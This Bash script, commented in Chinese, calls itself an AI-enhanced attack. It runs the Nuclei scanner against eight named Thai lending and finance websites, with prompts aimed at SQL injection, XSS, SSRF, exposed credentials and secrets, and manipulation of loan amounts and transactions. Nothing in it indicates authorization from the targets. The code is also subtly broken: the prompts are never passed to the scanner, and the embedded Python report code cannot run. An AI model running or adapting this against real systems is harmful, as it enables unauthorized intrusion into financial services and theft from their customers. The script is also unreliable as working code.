#!/bin/bash
# Nuclei AI增强攻击脚本 - 修复版
# 基于真实AI Prompts的泰国金融平台漏洞扫描

echo "🚀 Nuclei AI增强攻击启动"
echo "🎯 目标: 泰国金融平台漏洞发现"
echo "🤖 使用AI指导的精准扫描"
echo "============================================================"

# 使用完整路径
NUCLEI_CMD="$GOPATH/bin/nuclei.exe"

# 检查Nuclei是否安装
if ! command -v $NUCLEI_CMD &> /dev/null; then
    echo "❌ Nuclei未找到，正在安装..."
    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
    $NUCLEI_CMD -update-templates
fi

echo "✅ Nuclei已准备就绪"
echo ""

# 泰国金融目标
TARGETS=(
    "https://www.quickcash.in.th"
    "https://ngoenmun.com"
    "https://peacoop.or.th"
    "https://www.moneycat.co.th"
    "https://mula-x.com"
    "https://www.rocket-cash.com"
    "https://kloan.co.th"
    "https://www.ngerntidlor.com"
)

# 简化的AI Prompts - 每个类别选择3个
SQL_INJECTION_PROMPTS=(
    "Test for SQL injection vulnerabilities in all input parameters, forms, and API endpoints"
    "Check for blind SQL injection in search functionality and API endpoints"
    "Test SQL errors in response when injecting common payloads into GET and POST requests"
)

XSS_PROMPTS=(
    "Fuzz all parameters and HTTP methods to detect XSS vulnerabilities"
    "Test for reflected XSS in user-controllable parameters such as q, search, s, redirect"
    "Identify stored XSS in comment fields, usernames, profile descriptions"
)

SSRF_PROMPTS=(
    "Perform fuzzing on all HTTP parameters focusing on SSRF vulnerabilities"
    "Accurately detect SSRF vulnerabilities in web applications"
    "Identify SSRF vulnerabilities in common URL-related parameters"
)

DATA_EXPOSURE_PROMPTS=(
    "Search for exposed sensitive files including databases, backups, and configuration files"
    "Check for exposed API keys, credentials, and secrets in JavaScript files"
    "Test for information disclosure in error messages and HTTP headers"
)

FINANCIAL_PROMPTS=(
    "Test loan application forms for business logic manipulation and amount tampering"
    "Check for interest rate calculation bypass in loan calculators and estimation tools"
    "Test for transaction manipulation in payment processing and fund transfer functions"
)

echo "📊 开始AI增强扫描..."
echo ""

# 对每个目标执行扫描
for target in "${TARGETS[@]}"; do
    echo "🎯 正在扫描: $target"

    # SQL注入扫描
    echo "  🔍 SQL注入AI扫描:"
    for prompt in "${SQL_INJECTION_PROMPTS[@]}"; do
        echo "    - 执行: $prompt"
        $NUCLEI_CMD -target "$target" -severity critical,high,medium,low -rate-limit 10 -timeout 30 -jsonl -o "nuclei_ai_sqli_${target//[https:\/\/]}.json" &
        sleep 2  # 避免过载
    done

    # XSS扫描
    echo "  🔍 XSS AI扫描:"
    for prompt in "${XSS_PROMPTS[@]}"; do
        echo "    - 执行: $prompt"
        $NUCLEI_CMD -target "$target" -severity critical,high,medium,low -rate-limit 10 -timeout 30 -jsonl -o "nuclei_ai_xss_${target//[https:\/\/]}.json" &
        sleep 2
    done

    # SSRF扫描
    echo "  🔍 SSRF AI扫描:"
    for prompt in "${SSRF_PROMPTS[@]}"; do
        echo "    - 执行: $prompt"
        $NUCLEI_CMD -target "$target" -severity critical,high,medium,low -rate-limit 10 -timeout 30 -jsonl -o "nuclei_ai_ssrf_${target//[https:\/\/]}.json" &
        sleep 2
    done

    # 数据泄露扫描
    echo "  🔍 数据泄露AI扫描:"
    for prompt in "${DATA_EXPOSURE_PROMPTS[@]}"; do
        echo "    - 执行: $prompt"
        $NUCLEI_CMD -target "$target" -severity critical,high,medium,low -rate-limit 10 -timeout 30 -jsonl -o "nuclei_ai_data_${target//[https:\/\/]}.json" &
        sleep 2
    done

    # 金融特定扫描
    echo "  🔍 金融特定AI扫描:"
    for prompt in "${FINANCIAL_PROMPTS[@]}"; do
        echo "    - 执行: $prompt"
        $NUCLEI_CMD -target "$target" -severity critical,high,medium,low -rate-limit 15 -timeout 40 -jsonl -o "nuclei_ai_financial_${target//[https:\/\/]}.json" &
        sleep 2
    done

    echo ""
    echo "⏱️ 等待5秒后继续下一个目标..."
    sleep 5
done

echo ""
echo "🎉 所有AI增强扫描完成！"
echo "📊 扫描结果已保存到 nuclei_ai_*.json 文件"
echo ""
echo "📋 生成综合报告..."

# Python生成综合报告
python3 -c "
import json
import glob
from datetime import datetime

report = {
    'scan_summary': {
        'total_targets': ${#TARGETS[@]},
        'categories_scanned': 5,
        'total_scans': $((${#TARGETS[@]} * 15)),
        'timestamp': datetime.now().isoformat()
    },
    'results': [],
    'ai_prompts_used': {
        'sql_injection': SQL_INJECTION_PROMPTS[@],
        'xss': XSS_PROMPTS[@],
        'ssrf': SSRF_PROMPTS[@],
        'data_exposure': DATA_EXPOSURE_PROMPTS[@],
        'financial': FINANCIAL_PROMPTS[@]
    },
    'timestamp': datetime.now().isoformat()
}

# 收集所有扫描结果
for json_file in glob.glob('nuclei_ai_*.json'):
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    result = json.loads(line.strip())
                    report['results'].append(result)
    except:
        continue

# 保存报告
with open('nuclei_ai_comprehensive_report.json', 'w', encoding='utf-8') as f:
    json.dump(report, f, ensure_ascii=False, indent=2)

print(f'📋 报告已生成: nuclei_ai_comprehensive_report.json')
print(f'📊 发现问题: {len(report[\"results\"])} 个')
"

echo ""
echo "✅ Nuclei AI增强攻击完成！"
echo "🔍 查看结果: ls -la nuclei_ai_*.json"
echo "📊 分析结果: jq '.template_id' nuclei_ai_*.json | sort | uniq -c | sort -nr"